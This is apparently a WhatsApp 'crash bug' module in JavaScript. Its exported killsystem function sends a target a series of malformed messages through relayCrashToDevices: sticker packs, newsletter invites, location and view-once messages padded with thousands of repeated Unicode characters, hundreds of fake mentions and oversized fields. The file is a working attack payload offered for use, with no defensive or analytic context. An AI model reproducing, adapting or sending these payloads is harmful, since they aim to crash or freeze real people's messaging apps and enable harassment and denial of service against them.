const { relayCrashToDevices } = require('../target-utils');

function createSticker(fileName) {
  return {
    fileName,
    isAnimated: false,
    isLottie: true,
    mimetype: "application/pdf",
    emojis: ["🀄"],
    accessibilityLabel: "FlowX"
  };
}

async function StickerCrashInternal(SYxS7, target) {
  const repeatedText = "./Lolipop" + "؂ن؃؄ٽ؂ن؃".repeat(500);
  const message = {
    stickerPackMessage: {
      stickerPackId: "X",
      name: repeatedText,
      publisher: repeatedText,
      packDescription: repeatedText,
      stickers: [
        createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"),
        createSticker("KuVCPTiEvFIeCLuxUTgWRHdH7EYWcweh+S4zsrT24ks=.webp")
      ],
      fileLength: "999999",
      fileSha256: "4HrZL3oZ4aeQlBwN9oNxiJprYepIKT7NBpYvnsKdD2s=",
      fileEncSha256: "1ZRiTM82lG+D768YT6gG3bsQCiSoGM8BQo7sHXuXT2k=",
      mediaKey: "X9cUIsOIjj3QivYhEpq4t4Rdhd8EfD5wGoy9TNkk6Nk=",
      mediaKeyTimestamp: "1741150286",
      directPath: "/v/t62.15575-24/24265020_2042257569614740_7973261755064980747_n.enc",
      trayIconFileName: "2496ad84-4561-43ca-949e-f644f9ff8bb9.png",
      thumbnailDirectPath: "/v/t62.15575-24/11915026_616501337873956_5353655441955413735_n.enc",
      thumbnailSha256: "R6igHHOD7+oEoXfNXT+5i79ugSRoyiGMI/h8zxH/vcU=",
      thumbnailEncSha256: "xEzAq/JvY6S6q02QECdxOAzTkYmcmIBdHTnJbp3hsF8=",
      thumbnailHeight: 252,
      thumbnailWidth: 252,
      imageDataHash: "ODBkYWY0NjE1NmVlMTY5ODNjMTdlOGE3NTlkNWFkYTRkNTVmNWY0ZThjMTQwNmIyYmI1ZDUyZGYwNGFjZWU4ZQ==",
      stickerPackSize: "999999999",
      stickerPackOrigin: "1",
      contextInfo: {
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };
  return await relayCrashToDevices(SYxS7, target, message);
}

async function U(SYxS7, target) {
  const uw = "ោ៝".repeat(1000);
  const uz = "ꦾ".repeat(1000);
  const up = {
    newsletterAdminInviteMessage: {
      newsletterJid: "1234567891234@newsletter",
      newsletterName: "ApolysisHunter" + "ោ៝".repeat(1000),
      caption: "🩸 Killsystem Overload " + uw + uz,
      inviteExpiration: "90000",
      contextInfo: {
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast",
        mentionedJid: [target, "0@s.whatsapp.net"]
      }
    }
  };
  return await relayCrashToDevices(SYxS7, target, up);
}

async function C(SYxS7, target) {
  const uw = "ꦾ".repeat(1500);
  const mentionedJid = [target, "0@s.whatsapp.net"];
  for (let i = 0; i < 200; i++) {
    mentionedJid.push(`${Math.floor(10000000 + Math.random() * 89999999)}@s.whatsapp.net`);
  }

  const payload = {
    locationMessage: {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 139.99963118999,
      name: "‼️⃟ ༚ Killsystem " + uw,
      inviteLinkGroupTypeV2: "DEFAULT",
      merchantUrl: "https://whatsapp.com",
      url: "https://whatsapp.com",
      thumbnailUrl: "https://whatsapp.com",
      waWebSocketUrl: "https://whatsapp.com",
      mediaUrl: "https://whatsapp.com",
      sourceUrl: "https://whatsapp.com",
      originalImageUrl: "https://whatsapp.com",
      clickToWhatsappCall: true,
      contextInfo: {
        remoteJid: "@s.whatsapp.net",
        participant: "13135550002@s.whatsapp.net",
        disappearingMode: {
          initiator: "CHANGED_IN_CHAT",
          trigger: "CHAT_SETTING"
        },
        externalAdReply: {
          title: "KILLSYSTEM OVERLOAD",
          body: uw,
          mediaType: "IMAGE"
        },
        mentionedJid,
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        },
        nativeFlowMessage: {
          messageParamsJson: JSON.stringify({ status: "kill", count: 1000 })
        }
      }
    }
  };

  return await relayCrashToDevices(SYxS7, target, payload);
}

async function h(SYxS7, target) {
  const payload1 = {
    viewOnceMessage: {
      message: {
        extendedTextMessage: {
          text: "Brody " + "ꦽ".repeat(2000),
          nativeFlowMessage: {
            buttons: [
              {
                name: "catalog_message",
                buttonParamsJson: JSON.stringify({ caption: "Kuntul " + "ꦽ".repeat(500) })
              },
              {
                name: "cta_call",
                buttonParamsJson: JSON.stringify({ caption: "Kuntul " + "ꦽ".repeat(500) })
              }
            ]
          }
        }
      }
    }
  };

  const payload2 = {
    viewOnceMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "999999999@newsletter",
          newsletterName: "Killsystem " + "ꦽ".repeat(1000),
          caption: "Killsystem " + "ꦽ".repeat(1000),
          inviteExpiration: Date.now() + 1814400000
        }
      }
    }
  };

  const res1 = await relayCrashToDevices(SYxS7, target, payload1);
  const res2 = await relayCrashToDevices(SYxS7, target, payload2);
  return { success: res1.success || res2.success, deliveredCount: res1.deliveredCount + res2.deliveredCount, errors: [...res1.errors, ...res2.errors] };
}

async function killsystem(SYxS7, target) {
  let totalDelivered = 0;
  const errors = [];

  try {
    const r1 = await U(SYxS7, target);
    if (r1.success) totalDelivered += r1.deliveredCount; else errors.push(...r1.errors);

    const r2 = await C(SYxS7, target);
    if (r2.success) totalDelivered += r2.deliveredCount; else errors.push(...r2.errors);

    const r3 = await h(SYxS7, target);
    if (r3.success) totalDelivered += r3.deliveredCount; else errors.push(...r3.errors);

    const r4 = await StickerCrashInternal(SYxS7, target);
    if (r4.success) totalDelivered += r4.deliveredCount; else errors.push(...r4.errors);
  } catch (err) {
    errors.push(`killsystem: ${err.message}`);
  }

  return {
    success: totalDelivered > 0,
    deliveredCount: totalDelivered,
    errors
  };
}

module.exports = { killsystem };
